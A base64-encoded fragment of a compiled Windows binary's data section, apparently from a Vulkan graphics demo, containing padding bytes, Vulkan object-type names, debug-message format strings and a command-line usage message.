V1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dQAAAAAAAAAAAAAAAAAAAAAAAH0BQAEAAAAAAAAAAAAAAP//////////AAAAAAAAAAD/////AAAAAAAAAAAAAAAA/v///wAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAAGAAAAGv///9oAAAAAQAAAAAAAAAOAAAAAAAAAAAAAABAAAAAw7///8A/AAABAAAAAAAAAA4AAAAAAAAAAAAAAEAAAADDv///wD8AAAEAAAAAAAAADgAAAAAAAAAAAAAAABAFQAEAAAAFAAAAGQAAAH0AAAAAAAAAAAAAAAAAAACwdgFAAQAAAAAAAAAAAAAAAHcBQAEAAAAAAAAAAAAAACAZBUABAAAAKBkFQAEAAABgeAFAAQAAAI14AUABAAAAUFNUAFBEVAAAAAAAAAAAAKCNBEABAAAApI0EQAEAAACAcAAAAQAAALCNBEABAAAAwI0EQAEAAADEjQRAAQAAAGB3AUABAAAA4HcBQAEAAADAeAFAAQAAAPR4AUABAAAAPnkBQAEAAABSeQFAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsaWJnY2Nfc19kdzItMS5kbGwAX19yZWdpc3Rlcl9mcmFtZV9pbmZvAF9fZGVyZWdpc3Rlcl9mcmFtZV9pbmZvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABWS19PQkpFQ1RfVFlQRV9RVUVSWV9QT09MAFZLX09CSkVDVF9UWVBFX1NBTVBMRVJfWUNCQ1JfQ09OVkVSU0lPTgBWS19PQkpFQ1RfVFlQRV9TRU1BUEhPUkUAVktfT0JKRUNUX1RZUEVfU0hBREVSX01PRFVMRQBWS19PQkpFQ1RfVFlQRV9TV0FQQ0hBSU5fS0hSAFZLX09CSkVDVF9UWVBFX1NBTVBMRVIAVktfT0JKRUNUX1RZUEVfSU5ESVJFQ1RfQ09NTUFORFNfTEFZT1VUX05WAFZLX09CSkVDVF9UWVBFX0RFQlVHX1JFUE9SVF9DQUxMQkFDS19FWFQAVktfT0JKRUNUX1RZUEVfSU1BR0UAVktfT0JKRUNUX1RZUEVfVU5LTk9XTgBWS19PQkpFQ1RfVFlQRV9ERVNDUklQVE9SX1BPT0wAVktfT0JKRUNUX1RZUEVfQ09NTUFORF9CVUZGRVIAVktfT0JKRUNUX1RZUEVfQlVGRkVSAFZLX09CSkVDVF9UWVBFX1NVUkZBQ0VfS0hSAFZLX09CSkVDVF9UWVBFX0lOU1RBTkNFAFZLX09CSkVDVF9UWVBFX1ZBTElEQVRJT05fQ0FDSEVfRVhUAFZLX09CSkVDVF9UWVBFX0lNQUdFX1ZJRVcAVktfT0JKRUNUX1RZUEVfREVTQ1JJUFRPUl9TRVQAVktfT0JKRUNUX1RZUEVfREVTQ1JJUFRPUl9TRVRfTEFZT1VUAFZLX09CSkVDVF9UWVBFX0NPTU1BTkRfUE9PTABWS19PQkpFQ1RfVFlQRV9QSFlTSUNBTF9ERVZJQ0UAVktfT0JKRUNUX1RZUEVfRElTUExBWV9LSFIAVktfT0JKRUNUX1RZUEVfQlVGRkVSX1ZJRVcAVktfT0JKRUNUX1RZUEVfREVCVUdfVVRJTFNfTUVTU0VOR0VSX0VYVABWS19PQkpFQ1RfVFlQRV9GUkFNRUJVRkZFUgBWS19PQkpFQ1RfVFlQRV9ERVNDUklQVE9SX1VQREFURV9URU1QTEFURQBWS19PQkpFQ1RfVFlQRV9QSVBFTElORV9DQUNIRQBWS19PQkpFQ1RfVFlQRV9QSVBFTElORV9MQVlPVVQAVktfT0JKRUNUX1RZUEVfREVWSUNFX01FTU9SWQBWS19PQkpFQ1RfVFlQRV9GRU5DRQBWS19PQkpFQ1RfVFlQRV9RVUVVRQBWS19PQkpFQ1RfVFlQRV9ERVZJQ0UAVktfT0JKRUNUX1RZUEVfUkVOREVSX1BBU1MAVktfT0JKRUNUX1RZUEVfRElTUExBWV9NT0RFX0tIUgBWS19PQkpFQ1RfVFlQRV9FVkVOVABWS19PQkpFQ1RfVFlQRV9QSVBFTElORQBVbmhhbmRsZWQgVmtPYmplY3RUeXBlAABUhfv/fIX7/7yF+/+0hfv/XoT7/0SF+/+shfv/pIX7/0yF+/80hfv/zIX7/9yF+/+Ehfv/XIX7/ySF+/+Uhfv/nIX7/8SF+//Uhfv/bIX7/yyF+/88hfv/ZIX7/4yF+/90hfv/VkVSQk9TRSA6IABJTkZPIDogAFdBUk5JTkcgOiAARVJST1IgOiAAR0VORVJBTABWQUxJREFUSU9OAHwAUEVSRk9STUFOQ0UAJXMgLSBNZXNzYWdlIElkIE51bWJlcjogJWQgfCBNZXNzYWdlIElkIE5hbWU6ICVzCgklcwoACglPYmplY3RzIC0gJWQKAAkJT2JqZWN0WyVkXSAtICVzLCBIYW5kbGUgJXAsIE5hbWUgIiVzIgoACQlPYmplY3RbJWRdIC0gJXMsIEhhbmRsZSAlcAoACglDb21tYW5kIEJ1ZmZlciBMYWJlbHMgLSAlZAoACQlMYWJlbFslZF0gLSAlcyB7ICVmLCAlZiwgJWYsICVmfQoAQWxlcnQAAAAA7oj7//iI+/8Uifv/Aon7/wyJ+//kiPv/VXNhZ2U6CiAgJXMJWy0tdXNlX3N0YWdpbmddIFstLXZhbGlkYXRlXSBbLS12YWxpZGF0ZS1jaGVja3MtZGlzYWJsZWRdCglbLS1icmVha10gWy0tYyA8ZnJhbWVjb3VudD5dIFstLXN1cHByZXNzX3BvcHVwc10KCVstLWluY3JlbWVudGFsX3ByZXNlbnRdIFstLWRpc3BsYXlfdGltaW5nXQoJWy0tZ3B1X251bWJlciA8aW5kZXggb2YgcGh5c2ljYWwgZGV2aWNlPl0KCVstLXByZXNlbnRfbW9kZSA8cHJlc2VudCBtb2RlIGVudW0+XQoJWy0td2lkdGggPHdpZHRoPl0gWy0taGVpZ2h0IDxoZWlnaHQ+XQoJPHByZXNlbnRfbW9kZV9lbnVtPgoJCVZLX1BSRVNFTlRfTU9ERV9JTU1FRElBVEVfS0hSID0gJWQKCQlWS19QUkVTRU5UX01PREVfTUFJTEJPWF9LSFIgPSAlZAoJCVZLX1BSRVNFTlRfTU9ERV9GSUZPX0tIUiA9ICVkCgkJVktfUFJFU0VOVF9NT0RFX0ZJRk9fUkVMQVhFRF9LSFIgPSAlZAoAbWFpbgBWS19MQVlFUl9LSFJPTk9TX3ZhbGlkYXRpb24AQ2Fubm90IGZpbmQgbGF5ZXI6ICVzCgB2a0NyZWF0ZUluc3RhbmNlIEZhaWx1cmUAdmtFbnVtZXJhdGVJbnN0YW5jZUxheWVyUHJvcGVydGllcyBmYWlsZWQgdG8gZmlu